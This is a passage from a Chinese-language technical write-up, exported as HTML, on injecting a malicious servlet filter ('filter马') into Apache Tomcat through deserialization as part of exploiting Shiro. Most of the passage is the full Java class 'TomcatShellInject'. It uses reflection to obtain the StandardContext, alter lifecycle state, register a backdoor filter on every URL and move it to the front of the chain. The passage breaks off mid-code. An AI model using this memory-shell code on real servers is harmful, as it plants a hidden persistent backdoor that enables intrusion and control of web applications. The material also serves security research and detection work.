&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return ok;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">没错，它遍历了</span><span class="cs8926E06">filterDefs</span><span class="cs9C1B1871">，一个个实例化成</span><span class="cs8926E06">ApplicationFilterConfig</span><span class="cs9C1B1871">添加到</span><span class="cs8926E06">filterConfigs</span><span class="cs9C1B1871">了。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这两个问题解决了，是不是就完成了呢，其实还没有，还差一个优化的地方，因为我们想要把</span><span class="cs8926E06">filter</span><span class="cs9C1B1871">放到最前面，在所有</span><span class="cs8926E06">filter</span><span class="cs9C1B1871">前执行，从而解决</span><span class="cs8926E06">shiro</span><span class="cs9C1B1871">漏洞的问题。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">也简单，我们看回</span><span class="cs9FB05234">org.apache.catalina.core.ApplicationFilterFactory#createFilterChain</span><span class="cs9C1B1871">的代码：</span></p><p class="cs3A447A38"><span class="cs9FB05234">// Add the relevant path-mapped filters to this filter chain</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">for (int i = 0; i &lt; filterMaps.length; i++) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (!matchDispatcher(filterMaps[i] ,dispatcher)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;continue;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (!matchFiltersURL(filterMaps[i], requestPath))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;continue;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;ApplicationFilterConfig filterConfig = (ApplicationFilterConfig)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;context.findFilterConfig(filterMaps[i].getFilterName());</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (filterConfig == null) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// FIXME - log configuration problem</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;continue;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">创建的顺序是根据</span><span class="cs8926E06">filterMaps</span><span class="cs9C1B1871">的顺序来的，那么我们就有必要去修改我们添加的</span><span class="cs8926E06">filter</span><span class="cs9C1B1871">顺序到第一位了，最后，整个第二步骤的代码如下：</span></p><p class="cs3A447A38"><span class="cs9FB05234">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import java.io.IOException;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import javax.servlet.Filter;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import javax.servlet.FilterChain;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import javax.servlet.FilterConfig;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import javax.servlet.ServletException;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import javax.servlet.ServletRequest;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import javax.servlet.ServletResponse;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">/**</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> * @author threedr3am</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> */</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">public class TomcatShellInject extends AbstractTranslet implements Filter {</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;static {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*shell</span><span class="cs7FFD2630">注入，前提需要能拿到</span><span class="cs9FB05234">request</span><span class="cs7FFD2630">、</span><span class="cs9FB05234">response</span><span class="cs7FFD2630">等</span><span class="cs9FB05234">*/</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;java.lang.reflect.Field f = org.apache.catalina.core.ApplicationFilterChain.class</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.getDeclaredField(&quot;lastServicedRequest&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;f.setAccessible(true);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ThreadLocal t = (ThreadLocal) f.get(null);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ServletRequest servletRequest = null;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//</span><span class="cs7FFD2630">不为空则意味着第一次反序列化的准备工作已成功</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (t != null &amp;&amp; t.get() != null) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;servletRequest = (ServletRequest) t.get();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (servletRequest != null) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;javax.servlet.ServletContext servletContext = servletRequest.getServletContext();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;org.apache.catalina.core.StandardContext standardContext = null;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//</span><span class="cs7FFD2630">判断是否已有该名字的</span><span class="cs9FB05234">filter</span><span class="cs7FFD2630">，有则不再添加</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (servletContext.getFilterRegistration(&quot;threedr3am&quot;) == null) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//</span><span class="cs7FFD2630">遍历出标准上下文对象</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for (; standardContext == null; ) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;java.lang.reflect.Field contextField = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;contextField.setAccessible(true);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Object o = contextField.get(servletContext);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (o instanceof javax.servlet.ServletContext) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;servletContext = (javax.servlet.ServletContext) o;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else if (o instanceof org.apache.catalina.core.StandardContext) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;standardContext = (org.apache.catalina.core.StandardContext) o;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (standardContext != null) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//</span><span class="cs7FFD2630">修改状态，要不然添加不了</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;java.lang.reflect.Field stateField = org.apache.catalina.util.LifecycleBase.class</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.getDeclaredField(&quot;state&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;stateField.setAccessible(true);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTING_PREP);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//</span><span class="cs7FFD2630">创建一个自定义的</span><span class="cs9FB05234">Filter</span><span class="cs7FFD2630">马</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Filter threedr3am = new TomcatShellInject();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//</span><span class="cs7FFD2630">添加</span><span class="cs9FB05234">filter</span><span class="cs7FFD2630">马</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;javax.servlet.FilterRegistration.Dynamic filterRegistration = servletContext</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.addFilter(&quot;threedr3am&quot;, threedr3am);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;filterRegistration.setInitParameter(&quot;encoding&quot;, &quot;utf-8&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;filterRegistration.setAsyncSupported(false);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;filterRegistration</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), false,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;new String[]{&quot;/*&quot;});</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//</span><span class="cs7FFD2630">状态恢复，要不然服务不可用</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (stateField != null) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTED);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (standardContext != null) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//</span><span class="cs7FFD2630">生效</span><span class="cs9FB05234">filter</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;java.lang.reflect.Method filterStartMethod = org.apache.catalina.core.StandardContext.class</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.getMethod(&quot;filterStart&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;filterStartMethod.setAccessible(true);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;filterStartMethod.invoke(standardContext, null);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//</span><span class="cs7FFD2630">把</span><span class="cs9FB05234">filter</span><span class="cs7FFD2630">插到第一位</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;org.apache.tomcat.util.descriptor.web.FilterMap[] filterMaps = standardContext</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.findFilterMaps();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for (int i = 0; i &lt; filterMaps.length; i++) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (filterMaps[i].getFilterName().equalsIgnoreCase(&quot;threedr3am&quot;)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;org.apache.tomcat.util.descriptor.web.FilterMap filterMap = filterMaps[i];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;filterMaps[i] = filterMaps[0];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;filterMaps[0] = filterMap;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> 